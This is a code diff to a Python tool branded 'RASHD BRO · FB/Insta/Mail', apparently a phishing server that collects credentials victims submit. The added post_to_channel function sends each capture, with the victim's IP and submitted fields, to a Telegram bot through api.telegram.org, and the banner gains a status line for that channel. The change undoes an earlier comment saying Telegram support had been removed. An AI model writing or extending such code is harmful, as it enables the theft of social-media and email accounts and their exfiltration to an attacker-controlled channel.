@@ -32,7 +32,8 @@ def save_cfg(c):
     except: pass
 
 _CFG = load_cfg()
-# Telegram removed — Terminal mode only
+CHAT_ID  = _CFG.get('chat_id','')
+BOT_TOKEN = _CFG.get('bot_token','')
 
 WIDTH = 72
 TEMPLATES = {
@@ -257,6 +258,7 @@ class Handler(BaseHTTPRequestHandler):
             b=random.choice(["◆","★","⚡","●","✦","✷"])
             print(f"  {Fore.MAGENTA}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}{ld:<12}{Style.RESET_ALL}  {Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{b}{Style.RESET_ALL}  {vc}{vd}{Style.RESET_ALL}")
         print(); divid(f" ★ CAPTURE #{num} — [{tag}] {lbl} ★ ",ch="═")
+        post_to_channel(f"🔍 Capture #{num} [{tag}] {lbl}\n📍 {ip}\n📅 {datetime.now().strftime('%H:%M')}\n"+"\n".join([f"📌 {k.upper()}: {v[:30]}" for k,v in data.items()]))
         self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers(); self.wfile.write(b'OK')
 
 def make_h(sd):
@@ -265,6 +267,19 @@ def make_h(sd):
     return BH
 
 def launch(p,sd): return HTTPServer(("0.0.0.0",p),make_h(sd))
+
+
+# ══════════════════════════════════════════════════════
+#  TELEGRAM CHANNEL AUTO POST
+# ══════════════════════════════════════════════════════
+def post_to_channel(msg):
+    if CHAT_ID and CHAT_ID!="" and BOT_TOKEN:
+        try:
+            d={"chat_id":CHAT_ID,"text":msg,"parse_mode":"HTML","disable_web_page_preview":True}
+            u="https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage"
+            r=urllib.request.Request(u,data=urllib.parse.urlencode(d).encode(),headers={"Content-Type":"application/x-www-form-urlencoded"})
+            urllib.request.urlopen(r,timeout=15)
+        except: pass
 
 # ══════════════════════════════════════════════════════
 #  BANNER & MENUS
@@ -284,6 +299,12 @@ def banner():
     print(); print(center(grad("[ RASHD BRO · FB/Insta/Mail ]",[Fore.CYAN,Fore.MAGENTA,Fore.GREEN]),Fore.CYAN+Style.BRIGHT))
     print(); print(center(grad("Developer: v4zrashd",[Fore.RED,Fore.YELLOW]),""))
     print(); print(center(grad("RASHD BRO · Neon Edition v3.0",[Fore.MAGENTA,Fore.CYAN]),Fore.MAGENTA+Style.BRIGHT))
+    if CHAT_ID and CHAT_ID!="" and BOT_TOKEN:
+        print(center(f"  📡 Telegram Channel: {Fore.GREEN}🟢 ACTIVE{Style.RESET_ALL}",Fore.GREEN))
+    elif CHAT_ID:
+        print(center(f"  📡 Telegram Channel: {Fore.YELLOW}🔴 NO TOKEN{Style.RESET_ALL}",Fore.YELLOW))
+    else:
+        print(center(f"  📡 Telegram Channel: {Fore.RED}🔴 OFF{Style.RESET_ALL}",Fore.RED))
     print(); divid(ch="═")
 
 def site_menu():
